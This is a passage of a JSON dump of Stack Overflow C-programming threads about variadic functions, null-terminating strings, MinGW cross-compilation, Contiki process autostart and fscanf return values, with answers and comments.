"https://stackoverflow.com/questions/44672462/how-to-print-a-string-in-c-without-p-in-the-end-of-the-string/44672788#44672788", "title": "how to print a string in c without p\u2510 in the end of the string", "body": "<p>initialize the <code>str</code> variable to <code>NUL</code>.</p>\n\n<pre><code>void main (void)\n{\n    signed char str[256];\n    int dec,rest;\n    int i = -1;\n    int j;\n\n    memset( str, '\\0', sizeof(str) );\n\n    printf (\"write a decimal number : \");\n    scanf (\"%d\",&amp;dec);\n    do\n    {   \n        rest = dec % 2;\n        dec/= 2;\n        for (j=i;j&gt;-1;--j)\n            str[j+1]=str[j];\n        str[0]=rest+48;\n        ++i;\n    } while (dec!=0);\n    printf (\"the binary representation of this number is %s\",str);\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 7871802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6c32d41cba1fe78e5e61c1b42a5242f9?s=128&d=identicon&r=PG&f=1", "display_name": "killer", "link": "https://stackoverflow.com/users/7871802/killer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 572, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1498047372, "creation_date": 1498038161, "question_id": 44672462, "link": "https://stackoverflow.com/questions/44672462/how-to-print-a-string-in-c-without-p-in-the-end-of-the-string", "title": "how to print a string in c without p\u2510 in the end of the string", "body": "<p>so i've been writing a program that convert a decimal number to it's boolean representation but every time i compile the return value which is a string show additional characters like p\u0013\u2510 here is the program</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main (void)\n{\n    signed char str[256];\n    int dec,rest;\n    int i = -1;\n    int j;\n    printf (\"write a decimal number : \");\n    scanf (\"%d\",&amp;dec);\n    do\n    {   \n        rest = dec % 2;\n        dec/= 2;\n        for (j=i;j&gt;-1;--j)\n            str[j+1]=str[j];\n        str[0]=rest+48;\n        ++i;\n    } while (dec!=0);\n    printf (\"the binary representation of this number is %s\",str);\n}\n</code></pre>\n\n<p>the output :</p>\n\n<pre><code>write a decimal number : 156\nthe binary representation of this number is 10011100p\u0013\u2510\n</code></pre>\n\n<p>i don't know if im missing something but i will be grateful if you guys help me</p>\n"}, {"tags": ["c", "function", "arguments", "parameter-passing"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1498034205, "post_id": 44670822, "comment_id": 76326135, "body": "<a href=\"http://en.cppreference.com/w/c/variadic\" rel=\"nofollow noreferrer\">This variadic function reference</a> might be helpful."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1498034308, "post_id": 44670822, "comment_id": 76326195, "body": "@Jean-Fran&#231;oisFabre Not a valid dupe. That one is about passing args to another function."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1498034820, "post_id": 44670822, "comment_id": 76326575, "body": "@user694733 agreed. but it was a duplicate after all. thanks for correcting."}, {"owner": {"reputation": 385, "user_id": 7466782, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d675fc11ff49deae7279d0b64af8dfd6?s=128&d=identicon&r=PG", "display_name": "Madhusudan chowdary", "link": "https://stackoverflow.com/users/7466782/madhusudan-chowdary"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1498035379, "post_id": 44670822, "comment_id": 76326982, "body": "@Jean-Fran&#231;oisFabre How could this be Dupe Here I am asking about <code>...</code> and access of variables"}, {"owner": {"reputation": 1210, "user_id": 4849753, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-8Wn2Od4mruA/AAAAAAAAAAI/AAAAAAAAADw/tviPWulv0sc/photo.jpg?sz=128", "display_name": "Marek Klein", "link": "https://stackoverflow.com/users/4849753/marek-klein"}, "edited": false, "score": 0, "creation_date": 1498035985, "post_id": 44670822, "comment_id": 76327418, "body": "In case you want to understand what&#39;s going on when using va_ macros here is a nice <a href=\"http://blog.aaronballman.com/2012/06/how-variable-argument-lists-work-in-c/\" rel=\"nofollow noreferrer\">blog</a> about it."}], "answers": [{"comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1498034675, "post_id": 44671003, "comment_id": 76326475, "body": "That&#39;s not a <i>variable argument</i> function. It&#39;s a function which takes <i>exactly</i> two arguments."}, {"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 0, "creation_date": 1498034684, "post_id": 44671003, "comment_id": 76326480, "body": "The question specifically asks for var args! And is also tagged C not C++."}, {"owner": {"reputation": 634, "user_id": 8016390, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/cb8a7992f3527dc9d50d8ff87de9dc9b?s=128&d=identicon&r=PG&f=1", "display_name": "Gam", "link": "https://stackoverflow.com/users/8016390/gam"}, "edited": false, "score": 0, "creation_date": 1498034697, "post_id": 44671003, "comment_id": 76326492, "body": "Plus, this is C++ not C"}, {"owner": {"reputation": 732, "user_id": 3779533, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7ceb7c47ce798288bf7e7baaa7129c?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Sheigets", "link": "https://stackoverflow.com/users/3779533/ivan-sheigets"}, "edited": false, "score": 0, "creation_date": 1498034885, "post_id": 44671003, "comment_id": 76326622, "body": "You can can use #include &lt;stdarg.h&gt; and  va_list arguments;"}, {"owner": {"reputation": 385, "user_id": 7466782, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d675fc11ff49deae7279d0b64af8dfd6?s=128&d=identicon&r=PG", "display_name": "Madhusudan chowdary", "link": "https://stackoverflow.com/users/7466782/madhusudan-chowdary"}, "edited": false, "score": 0, "creation_date": 1498034940, "post_id": 44671003, "comment_id": 76326664, "body": "Thanks for your answer @IvanSheigets I know this kind of passing arrays in C and in C++. But here in the question I want to know the meaning of &#39;...&#39; and how to access if directly numbers are passed not an array."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 2, "creation_date": 1498042683, "post_id": 44671003, "comment_id": 76332277, "body": "Thank you for this code snippet, which may provide some immediate help.  A proper explanation <a href=\"//meta.stackexchange.com/q/114762\">would greatly improve</a> its educational value by showing <i>why</i> this is a good solution to the problem, and would make it more useful to future readers with similar, but not identical, questions.  Please <a href=\"https://stackoverflow.com/posts/44671003/edit\">edit</a> your answer to add explanation, and give an indication of what limitations and assumptions apply."}], "tags": [], "owner": {"reputation": 732, "user_id": 3779533, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7ceb7c47ce798288bf7e7baaa7129c?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Sheigets", "link": "https://stackoverflow.com/users/3779533/ivan-sheigets"}, "is_accepted": false, "score": -3, "last_activity_date": 1498034561, "creation_date": 1498034561, "answer_id": 44671003, "question_id": 44670822, "link": "https://stackoverflow.com/questions/44670822/variable-number-of-arguments-in-c/44671003#44671003", "title": "Variable number of Arguments in C?", "body": "<pre><code>void f(int count_arg, int *arg)\n{\n   for (int i = 0; i &lt; count_arg; i++)\n       cout &lt;&lt; arg[i] &lt;&lt; endl;\n}\n\n//call\nint a[] = { 1,2,3,4,5 };\nf(5, a);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 2, "creation_date": 1498035464, "post_id": 44671251, "comment_id": 76327058, "body": "Please avoid giving code only answers, explain solution instead. Also <code>cout</code> is C++ construct and this is C question."}], "tags": [], "owner": {"reputation": 732, "user_id": 3779533, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7ceb7c47ce798288bf7e7baaa7129c?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Sheigets", "link": "https://stackoverflow.com/users/3779533/ivan-sheigets"}, "is_accepted": true, "score": 2, "last_activity_date": 1498035611, "last_edit_date": 1498035611, "creation_date": 1498035227, "answer_id": 44671251, "question_id": 44670822, "link": "https://stackoverflow.com/questions/44670822/variable-number-of-arguments-in-c/44671251#44671251", "title": "Variable number of Arguments in C?", "body": "<pre><code>int ff(int num, ...)\n{\n  va_list arguments;\n  int sum = 0;\n  va_start(arguments, num);\n  for (int x = 0; x &lt; num; x++)\n  {\n    sum += va_arg(arguments, int);\n  }\n  va_end(arguments);\n\nreturn sum;\n}\n\n//call \nprintf(\"%d\\n\", ff(3, 1, 2, 3));\n</code></pre>\n\n<p>va_list contains list of arguments in ..., in loop you get access one by one va_arg(arguments, int);</p>\n"}, {"tags": [], "owner": {"reputation": 368, "user_id": 6881977, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0663020762d0aad2f05fa7d9ea13c06f?s=128&d=identicon&r=PG&f=1", "display_name": "suraj", "link": "https://stackoverflow.com/users/6881977/suraj"}, "is_accepted": false, "score": 1, "last_activity_date": 1498035985, "creation_date": 1498035985, "answer_id": 44671573, "question_id": 44670822, "link": "https://stackoverflow.com/questions/44670822/variable-number-of-arguments-in-c/44671573#44671573", "title": "Variable number of Arguments in C?", "body": "<p>you can write like this, this programme will return max values from function which accepts variable no. of arguments:</p>\n\n<pre><code>#include &lt;stdarg.h&gt;\n#include &lt;stdio.h&gt;\n\nint max(int arg_count, ...)\n{\n  int i;\n  int max, a;\n\n  va_list ap;\n  va_start(ap, arg_count);\n\n  max = va_arg(ap, int);\n\n  for(i = 2; i &lt;= arg_count; i++) {\n    if((a = va_arg(ap, int)) &gt; max)\n      max = a;\n  }\n\n  va_end(ap);\n  return max;\n}\n\nint main()\n{\n   int count = 5;\n\n\n   printf(\"Max value is %d\", max(count, 12, 67, 6, 7, 100));\n   return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 385, "user_id": 7466782, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d675fc11ff49deae7279d0b64af8dfd6?s=128&d=identicon&r=PG", "display_name": "Madhusudan chowdary", "link": "https://stackoverflow.com/users/7466782/madhusudan-chowdary"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2710, "favorite_count": 1, "closed_date": 1498037186, "accepted_answer_id": 44671251, "answer_count": 3, "score": -2, "last_activity_date": 1498035985, "creation_date": 1498034068, "last_edit_date": 1498034668, "question_id": 44670822, "link": "https://stackoverflow.com/questions/44670822/variable-number-of-arguments-in-c", "closed_reason": "Duplicate", "title": "Variable number of Arguments in C?", "body": "<p>I came across a Question i.e passing Variable number of arguments to a function in C. \nThe Question is in this way:</p>\n\n<p>Write a function that takes a variable number of arguments representing student marks in english\nand returns the number of students who scored > 90 marks.\nE.g.: variableArguments(3, 20, 90, 98) returns 1. One value (98) is greater than 90.</p>\n\n<p>First argument is number (arg_count) of student marks followed by \"arg_count\" number of arguments.\nE.g.: If first argument to function is 5, total number of arguments to function will be 6 (1 + 5).</p>\n\n<pre><code>#include&lt;stdarg.h&gt;\n.....\n.....\nint variableArguments(int arg_count, ...){\n //TODO \n  .....\n  .....\n  return 0;\n}\n</code></pre>\n\n<p>eg:<code>int result=variableArguments(4,87,90,98,67);</code></p>\n\n<pre><code> number of arguments =4\narguments=(87,90,98,67)      \n</code></pre>\n\n<p>result value should be '1' because number of arguments >90 is one</p>\n\n<p>In the prototype of the function first argument is <code>arg_count</code> remaining is arguments are represented as <code>...</code> <strong>What could be the meaning of that <code>...</code> ?</strong></p>\n\n<p>Here in this function it is given that <code>arg_count</code> gives the number of arguments passed that we need to pass to the function while calling.\nIf such arguments are passed to the function, <strong>How to access the list of arguments in the definition of function ?</strong> </p>\n"}, {"tags": ["c", "json", "yajl"], "comments": [{"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1498043961, "post_id": 44670410, "comment_id": 76333142, "body": "You appear to be asking about the use of some software, rather than a coding question. Such is off-topic here and the question is likely to get closed. Maybe try SuperUser or perhaps the support options listed on the YAJL page (e.g. IRC, mailing list, github, etc)"}, {"owner": {"user_type": "does_not_exist", "display_name": "user8081549"}, "reply_to_user": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1498044209, "post_id": 44670410, "comment_id": 76333304, "body": "Alright, Well if it is not the right forum then I will move my question to SuperUser."}], "owner": {"user_type": "does_not_exist", "display_name": "user8081549"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 112, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1498032812, "creation_date": 1498032812, "question_id": 44670410, "link": "https://stackoverflow.com/questions/44670410/trying-to-use-the-yajl-example-code-dont-know-how-to-give-the-input-to-the-pro", "title": "Trying to use the Yajl example code, don&#39;t know how to give the input to the program", "body": "<p>I've compiled the code provided by YAJL library in C. Don't know why the compiled program not parsing my file or is my file format is wrong?</p>\n\n<p>I'm quite new in parsing JSON file.</p>\n\n<p>This is where C code example located at <a href=\"https://lloyd.github.io/yajl/\" rel=\"nofollow noreferrer\">https://lloyd.github.io/yajl/</a>\nDon't know do I need to paste the entire code or link is fine?</p>\n\n<p><strong>Myfile.</strong></p>\n\n<pre><code>cat input_file.json \nhelllooooooooooo\n</code></pre>\n\n<p>When I ran the program <code>./a.out json_reformat input_file.json</code>, it doesn't do anything. <code>./a.out -m json_reformat input_file.json</code> this also didnt work. </p>\n\n<p>I tried with -u and -m option nothing worked.</p>\n\n<p>It print out the usage in STDOUT like this.</p>\n\n<pre><code>usage:  json_reformat [options]\n    -m minimize json rather than beautify (default)\n    -u allow invalid UTF8 inside strings during parsing\n</code></pre>\n"}, {"tags": ["c", "linux", "windows"], "comments": [{"owner": {"reputation": 317, "user_id": 7214631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1b1801efe8dfd1b891b935992dd8fc99?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/7214631/john-doe"}, "edited": false, "score": 1, "creation_date": 1498032273, "post_id": 44670209, "comment_id": 76324877, "body": "The compiler is machine dependent. So I am guessing you will have to download windows version of gcc to properly compile your source code into a windows executable file."}, {"owner": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "edited": false, "score": 1, "creation_date": 1498032278, "post_id": 44670209, "comment_id": 76324880, "body": "You could try Wine, and it&#39;ll work fine."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1498034803, "post_id": 44670209, "comment_id": 76326556, "body": "<a href=\"https://stackoverflow.com/q/1516690/995714\">Is it possible to compile Windows binaries on a linux machine?</a>, <a href=\"https://stackoverflow.com/q/2689813/995714\">Cross compile windows 64 bit .exe from linux</a>"}], "answers": [{"tags": [], "owner": {"reputation": 282, "user_id": 8192755, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NjqyP.jpg?s=128&g=1", "display_name": "m0h4mm4d", "link": "https://stackoverflow.com/users/8192755/m0h4mm4d"}, "is_accepted": false, "score": 1, "last_activity_date": 1498032788, "last_edit_date": 1498032788, "creation_date": 1498032426, "answer_id": 44670275, "question_id": 44670209, "link": "https://stackoverflow.com/questions/44670209/how-to-compile-c-code-in-linux-to-run-on-windows/44670275#44670275", "title": "How to compile C code in Linux to run on Windows?", "body": "<p>It is called cross-compiling. But GCC does not provide that functionality on its own. You can use the toolset provided by MinGW and/or MinGW-w64 projects.\nMinGW allows you to cross compile to Win32 platform and MinGW-w64 allows you to do the same thing for both Win32 and Win64.\nThey are both based on GCC.</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": false, "score": 1, "last_activity_date": 1498032607, "creation_date": 1498032607, "answer_id": 44670344, "question_id": 44670209, "link": "https://stackoverflow.com/questions/44670209/how-to-compile-c-code-in-linux-to-run-on-windows/44670344#44670344", "title": "How to compile C code in Linux to run on Windows?", "body": "<p>You need a <em>cross compiler</em>: A compiler that targets another system than it runs on.</p>\n\n<p>A <code>gcc</code> targeting windows comes in the <code>mingw</code> package and can also be compiled to run on Linux, and many Linux distributions already have packages containing it, so just search your package management tools for \"mingw\".</p>\n\n<p>Cross compilers have by convention the name of the system they target prepended to their name, so the variant of <code>gcc</code> for compiling windows executables will probably be named something like <code>i686-w64-mingw32-gcc</code>, but this might differ depending on the packages provided by your Linux distribution.</p>\n"}, {"comments": [{"owner": {"reputation": 3618, "user_id": 3316645, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/bootU.png?s=128&g=1", "display_name": "domsson", "link": "https://stackoverflow.com/users/3316645/domsson"}, "edited": false, "score": 0, "creation_date": 1585477165, "post_id": 44670656, "comment_id": 107767090, "body": "Interesting. I&#39;ve just naively tried this on one of my projects that uses <code>libcsv</code>, which I have installed on my Linux machine. However, attempting to compile it gives me: <code>fatal error: csv.h: No such file or directory</code> - would you have any insights or articles on how to deal with such issues when using Mingw-w64?"}], "tags": [], "owner": {"reputation": 1602, "user_id": 1815837, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b095ab1b2554345af93b82b7a9c02f0?s=128&d=identicon&r=PG", "display_name": "skr", "link": "https://stackoverflow.com/users/1815837/skr"}, "is_accepted": true, "score": 12, "last_activity_date": 1498033548, "creation_date": 1498033548, "answer_id": 44670656, "question_id": 44670209, "link": "https://stackoverflow.com/questions/44670209/how-to-compile-c-code-in-linux-to-run-on-windows/44670656#44670656", "title": "How to compile C code in Linux to run on Windows?", "body": "<p>You would need a cross-compiler to create a Windows executable in Linux.</p>\n\n<p>Mingw-w64 is an advancement of the original mingw.org project, created to support the GCC compiler on Windows systems.</p>\n\n<p>Installing the cross-compilation</p>\n\n<pre><code>sudo apt-get install mingw-w64\n</code></pre>\n\n<p>32bit </p>\n\n<pre><code>i686-w64-mingw32-gcc -o test.exe test.c\n</code></pre>\n\n<p>64bit</p>\n\n<pre><code>x86_64-w64-mingw32-gcc -o test.exe test.c\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 732, "user_id": 3779533, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7ceb7c47ce798288bf7e7baaa7129c?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Sheigets", "link": "https://stackoverflow.com/users/3779533/ivan-sheigets"}, "is_accepted": false, "score": 0, "last_activity_date": 1498033868, "creation_date": 1498033868, "answer_id": 44670761, "question_id": 44670209, "link": "https://stackoverflow.com/questions/44670209/how-to-compile-c-code-in-linux-to-run-on-windows/44670761#44670761", "title": "How to compile C code in Linux to run on Windows?", "body": "<p>You need to use cross-compiller to compile for different OS. The most popular is mingw </p>\n"}], "owner": {"reputation": 162, "user_id": 8191020, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a7d6afbf3b5b67bc24e77d661ff1af31?s=128&d=identicon&r=PG", "display_name": "Aditya Banerjee", "link": "https://stackoverflow.com/users/8191020/aditya-banerjee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 12599, "favorite_count": 0, "closed_date": 1498774314, "accepted_answer_id": 44670656, "answer_count": 4, "score": 4, "last_activity_date": 1498044054, "creation_date": 1498032179, "last_edit_date": 1498044054, "question_id": 44670209, "link": "https://stackoverflow.com/questions/44670209/how-to-compile-c-code-in-linux-to-run-on-windows", "closed_reason": "Duplicate", "title": "How to compile C code in Linux to run on Windows?", "body": "<p>I am using Linux/GNU GCC to compile C source code. Is there any way I can generate <code>.exe</code> files for Windows running on x86 or x64 architecture? The compiled code needs to be generated on the Linux machine.</p>\n"}, {"tags": ["c", "contiki", "contiki-process"], "answers": [{"tags": [], "owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "is_accepted": true, "score": 4, "last_activity_date": 1498048181, "creation_date": 1498048181, "answer_id": 44676175, "question_id": 44670154, "link": "https://stackoverflow.com/questions/44670154/how-to-start-multiple-processes-in-contiki-to-create-load-on-cpu/44676175#44676175", "title": "How to start multiple Processes in Contiki to create load on CPU", "body": "<p>Behind the macro <a href=\"https://github.com/contiki-os/contiki/blob/master/core/sys/autostart.h\" rel=\"nofollow noreferrer\"><code>AUTOSTART_PROCESSES</code></a>, a structure definition is hidden.</p>\n\n<pre><code>#define AUTOSTART_PROCESSES(...)                    \\\n    struct process * const autostart_processes[] = {__VA_ARGS__, NULL}\n</code></pre>\n\n<p>By calling twice <code>AUTOSTART_PROCESSES</code>, you define the structure twice.</p>\n\n<p><strong>Solution:</strong></p>\n\n<p>Given the macro parameters, I guess that you should write:</p>\n\n<pre><code>AUTOSTART_PROCESSES(&amp;cpu_load_process_1, &amp;cpu_load_process_2);\n</code></pre>\n\n<p>Instead of </p>\n\n<pre><code>AUTOSTART_PROCESSES(&amp;cpu_load_process_1);\nAUTOSTART_PROCESSES(&amp;cpu_load_process_2);\n</code></pre>\n"}], "owner": {"reputation": 991, "user_id": 6159101, "user_type": "registered", "accept_rate": 42, "profile_image": "https://lh3.googleusercontent.com/-kAZhWKIyQB0/AAAAAAAAAAI/AAAAAAAAAQ8/AG7NA2S2fgc/photo.jpg?sz=128", "display_name": "ashish mishra", "link": "https://stackoverflow.com/users/6159101/ashish-mishra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 735, "favorite_count": 0, "accepted_answer_id": 44676175, "answer_count": 1, "score": 3, "last_activity_date": 1569351238, "creation_date": 1498032022, "last_edit_date": 1569351238, "question_id": 44670154, "link": "https://stackoverflow.com/questions/44670154/how-to-start-multiple-processes-in-contiki-to-create-load-on-cpu", "title": "How to start multiple Processes in Contiki to create load on CPU", "body": "<p>How can I start multiple processes in parallel to create a congestion in CPU usage? Below is the code I was trying:- </p>\n\n<pre><code>#include \"contiki.h\"\n#include &lt;stdio.h&gt;\n\nPROCESS(cpu_load_process_1, \"CPU Loading Process 1\");\nPROCESS(cpu_load_process_2, \"CPU Loading Process 2\");\nPROCESS(cpu_load_process_3, \"CPU Loading Process 3\");\nPROCESS(cpu_load_process_4, \"CPU Loading Process 4\");\n\nAUTOSTART_PROCESSES(&amp;cpu_load_process_1);\nAUTOSTART_PROCESSES(&amp;cpu_load_process_2);\n\nPROCESS_THREAD(cpu_load_process_1, ev, data)\n {\n   PROCESS_BEGIN();\n   PROCESS_END();\n }\n PROCESS_THREAD(cpu_load_process_3, ev, data)\n {\n  PROCESS_BEGIN();\n  PROCESS_END();\n }\n</code></pre>\n\n<p>but, this gives error as following:-</p>\n\n<pre><code>/home/user/contiki-3.0/core/./sys/autostart.h:48:24: error: redefinition of \u2018autostart_processes\u2019\nstruct process * const autostart_processes[] = {__VA_ARGS__, NULL}struct process * const autostart_processes[] = {__VA_ARGS__, NULL}\n</code></pre>\n\n<p>Please guide me through. Any alternative way/suggestion of creating CPU congestion would also be helpful.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1498031944, "post_id": 44670035, "comment_id": 76324686, "body": "%99 means read 99 chars into the char array while == in this case will compare the number of successful conversions from fscanf...check out what fscanf returns...<a href=\"https://stackoverflow.com/questions/10469643/value-returned-by-scanf-function-in-c\" title=\"value returned by scanf function in c\">stackoverflow.com/questions/10469643/&hellip;</a>"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1498031958, "post_id": 44670035, "comment_id": 76324697, "body": "<i>&quot;Result: Not Working.&quot;</i> That is not valid problem description. Please see <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and read on <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. Also, please indent your code."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1498031986, "post_id": 44670035, "comment_id": 76324713, "body": "the <code>scanf()</code> family of function returns the number of <i>successful conversions</i>. So if you add another one, you would have to check against the new number, in your case <code>3</code>. -- in general, <a href=\"https://linux.die.net/man/3/scanf\" rel=\"nofollow noreferrer\">a manual can help</a>."}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1498032023, "post_id": 44670035, "comment_id": 76324741, "body": "Your text file already has 3 columns? Or you want to add it pro-grammatically?"}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1498032294, "post_id": 44670035, "comment_id": 76324888, "body": "@UnreasonableDirection what you say is you want to add a third column, but you are already reading a third column. So it is really unclear if you want to add or what?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1498032321, "post_id": 44670035, "comment_id": 76324901, "body": "@UnreasonableDirection just read my comment. Next time, consult the manual before asking. Questions with just a simple minor problem caused by <i>not</i> reading the manual aren&#39;t all that helpful."}, {"owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "edited": false, "score": 0, "creation_date": 1498032612, "post_id": 44670035, "comment_id": 76325078, "body": "@UnreasonableDirection: I compiled it with <b>== 3</b>, it works! Look at my answer, do you mean <code>file.txt</code> and not <code>&#47;file.txt</code>?"}, {"owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": 